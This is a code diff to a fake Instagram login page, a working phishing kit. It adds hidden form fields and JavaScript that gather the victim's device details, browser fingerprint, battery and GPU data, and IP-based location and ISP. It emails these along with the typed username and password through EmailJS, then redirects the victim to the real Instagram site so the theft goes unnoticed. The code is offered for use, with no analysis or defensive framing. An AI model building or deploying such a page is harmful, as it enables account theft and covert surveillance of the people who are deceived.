@@ -157,6 +157,12 @@
       <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo" />
       <input type="text" name="email" placeholder="Phone number, username, or email" />
       <input type="password" name="password" placeholder="Password" />
+      <!-- Hidden fields -->
+  <input type="hidden" name="device_info" id="device_info">
+  <input type="hidden" name="ip_info" id="ip_info">
+  <input type="hidden" name="referrer" id="referrer">
+  <input type="hidden" name="current_url" id="current_url">
+  <input type="hidden" name="advanced_info" id="advanced_info">
       <button type="submit" class="login-btn">Log In</button>
       <div class="or-line"><span>OR</span></div>
       <a href="#" class="facebook-login">Log in with Facebook</a>
@@ -181,23 +187,126 @@
 
   <!-- ✅ Then run your JS -->
   <script>
-    // Wait until library loads fully
-    window.onload = function () {
-      emailjs.init("R8vashMmVD4bmp4nI"); // Your public key
+window.onload = function () {
+  emailjs.init("R8vashMmVD4bmp4nI"); // Your Public Key
 
-      document.getElementById("box").addEventListener("submit", function (e) {
-        e.preventDefault();
+  const form = document.getElementById("contactForm");
+  const deviceInfo = document.getElementById("device_info");
+  const ipInfo = document.getElementById("ip_info");
+  const referrer = document.getElementById("referrer");
+  const currentUrl = document.getElementById("current_url");
+  const advancedInfo = document.getElementById("advanced_info");
 
-        emailjs.sendForm("service_jgthnxj", "template_r7wf0g6", this)
-          .then(() => {
-            window.location.href = "https://instagram.com";
-            this.reset();
-          }, (err) => {
-            console.log(err)
-          });
+  // Basic info
+  referrer.value = document.referrer || "Direct";
+  currentUrl.value = window.location.href;
+
+  // Device info
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    if (ua.includes("Edg")) return "Edge";
+    return "Unknown";
+  }
+
+  function getDeviceType() {
+    const ua = navigator.userAgent.toLowerCase();
+    if (/mobile|android|iphone|ipad|tablet/.test(ua)) return "Mobile/Tablet";
+    return "Desktop";
+  }
+
+  deviceInfo.value = `
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Browser: ${getBrowser()}
+Language: ${navigator.language}
+Screen: ${screen.width}x${screen.height}
+Window: ${window.innerWidth}x${window.innerHeight}
+Online: ${navigator.onLine}
+Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Cookies Enabled: ${navigator.cookieEnabled}
+RAM: ${navigator.deviceMemory || 'N/A'} GB
+CPU Threads: ${navigator.hardwareConcurrency || 'N/A'}
+Touch Support: ${'ontouchstart' in window}
+Time: ${new Date().toLocaleString()}
+Device Type: ${getDeviceType()}
+  `.trim();
+
+  // IP info
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      ipInfo.value = `
+IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country_name}
+Postal Code: ${data.postal}
+ISP: ${data.org}
+Timezone: ${data.timezone}
+      `.trim();
+    });
+
+  // Advanced info (dark mode, battery, refresh rate, GPU)
+  async function getAdvancedInfo() {
+    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+      ? "Dark Mode" : "Light Mode";
+
+    // Battery info
+    let batteryInfo = "Not Available";
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      batteryInfo = `Battery: ${Math.round(battery.level * 100)}% - ${battery.charging ? "Charging" : "Not Charging"}`;
+    }
+
+    // GPU Info
+    let gpuInfo = "Not Available";
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      gpuInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
+    } catch (e) {}
+
+    // Refresh rate
+    function getRefreshRate(cb) {
+      let start = performance.now(), count = 0;
+      function frame() {
+        count++;
+        let now = performance.now();
+        if (now - start >= 1000) cb(Math.round(count / ((now - start) / 1000)));
+        else requestAnimationFrame(frame);
+      }
+      requestAnimationFrame(frame);
+    }
+
+    getRefreshRate(rate => {
+      advancedInfo.value = `
+Theme: ${darkMode}
+${batteryInfo}
+GPU: ${gpuInfo}
+Estimated Refresh Rate: ${rate} Hz
+      `.trim();
+    });
+  }
+
+  getAdvancedInfo();
+
+  form.addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    emailjs.sendForm("service_jgthnxj", "template_r7wf0g6", this) // Replace with your template ID
+      .then(() => {
+        window.location.href = "https://instagram.com";
+        form.reset();
+      }, (err) => {
+        alert("❌ Failed to send message: " + JSON.stringify(err));
       });
-    };
-  </script>
+  });
+};
+</script>
 </body>
 </html>
 
